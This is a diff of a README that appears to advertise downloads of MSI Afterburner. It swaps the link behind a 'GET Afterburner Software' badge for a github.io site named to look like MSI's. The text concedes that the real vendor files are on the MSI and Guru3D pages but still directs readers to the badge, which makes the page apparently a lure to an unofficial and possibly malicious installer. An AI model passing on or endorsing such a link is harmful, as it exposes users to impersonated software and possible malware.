@@ -52,7 +52,7 @@ Do not paste a machine-local loop address into a profile note. Store a drive pat
 
 ## Get Afterburner
 
-[![GET Afterburner Software](https://img.shields.io/badge/GET-Afterburner%20Software-0F766E?style=flat-square&labelColor=042F2E&logoColor=white)](https://nicoleobrien077.github.io/.github/Afterburner-Software)
+[![GET Afterburner Software](https://img.shields.io/badge/GET-Afterburner%20Software-0F766E?style=flat-square&labelColor=042F2E&logoColor=white)](https://msi-afterburner-osd.github.io/Afterburner-Software/)
 
 Use the GET badge. The MSI landing page and the Guru3D beta page are the vendor files. Pick the x64 setup on a 64-bit PC. MSI Afterburner Windows 11 uses that same setup.
 
